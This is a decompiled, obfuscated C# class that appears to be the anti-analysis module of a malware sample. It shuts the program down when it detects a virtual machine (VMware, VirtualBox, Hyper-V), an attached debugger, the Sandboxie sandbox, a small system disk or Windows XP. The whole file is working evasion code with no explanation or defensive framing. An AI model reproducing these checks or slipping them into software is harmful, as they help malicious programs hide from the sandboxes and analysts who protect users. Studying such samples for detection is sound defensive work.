using System;
using System.Diagnostics;
using System.IO;
using System.Management;
using Microsoft.VisualBasic.Devices;

namespace vKSmRqGoNtRxzam
{
	// Token: 0x02000006 RID: 6
	internal class tyektVkGihNsvBB
	{
		// Token: 0x06000026 RID: 38 RVA: 0x00002141 File Offset: 0x00000341
		public static void FkBnxnvHpvc()
		{
			if (tyektVkGihNsvBB.sGePQewwjxG() || tyektVkGihNsvBB.HpDmrvcYsXuqz() || tyektVkGihNsvBB.ZmTrTiesovhN() || tyektVkGihNsvBB.xoLGxvjJIiDKNlE() || tyektVkGihNsvBB.kBnsHcUGRztpX())
			{
				Environment.FailFast(null);
			}
		}

		// Token: 0x06000027 RID: 39 RVA: 0x000033F8 File Offset: 0x000015F8
		private static bool xoLGxvjJIiDKNlE()
		{
			try
			{
				long num = 61000000000L;
				if (new DriveInfo(Path.GetPathRoot(Environment.SystemDirectory)).TotalSize <= num)
				{
					return true;
				}
			}
			catch
			{
			}
			return false;
		}

		// Token: 0x06000028 RID: 40 RVA: 0x00003450 File Offset: 0x00001650
		private static bool kBnsHcUGRztpX()
		{
			try
			{
				if (new ComputerInfo().OSFullName.ToLower().Contains("xp"))
				{
					return true;
				}
			}
			catch
			{
			}
			return false;
		}

		// Token: 0x06000029 RID: 41 RVA: 0x000034A0 File Offset: 0x000016A0
		private static bool sGePQewwjxG()
		{
			try
			{
				using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("Select * from Win32_ComputerSystem"))
				{
					using (ManagementObjectCollection managementObjectCollection = managementObjectSearcher.Get())
					{
						foreach (ManagementBaseObject managementBaseObject in managementObjectCollection)
						{
							string text = managementBaseObject["Manufacturer"].ToString().ToLower();
							if ((text == "microsoft corporation" && managementBaseObject["Model"].ToString().ToUpperInvariant().Contains("VIRTUAL")) || text.Contains("vmware") || managementBaseObject["Model"].ToString() == "VirtualBox")
							{
								return true;
							}
						}
					}
				}
			}
			catch
			{
			}
			return false;
		}

		// Token: 0x0600002A RID: 42 RVA: 0x000035DC File Offset: 0x000017DC
		private static bool HpDmrvcYsXuqz()
		{
			bool flag = false;
			bool result;
			try
			{
				rIfzBHOgIAYDt.HOvUiiDUhNHY(Process.GetCurrentProcess().Handle, ref flag);
				result = flag;
			}
			catch
			{
				result = flag;
			}
			return result;
		}

		// Token: 0x0600002B RID: 43 RVA: 0x00003620 File Offset: 0x00001820
		private static bool ZmTrTiesovhN()
		{
			bool result;
			try
			{
				if (rIfzBHOgIAYDt.QthxerGUbhkgdoDbM("SbieDll.dll").ToInt32() != 0)
				{
					result = true;
				}
				else
				{
					result = false;
				}
			}
			catch
			{
				result = false;
			}
			return result;
		}
	}
}
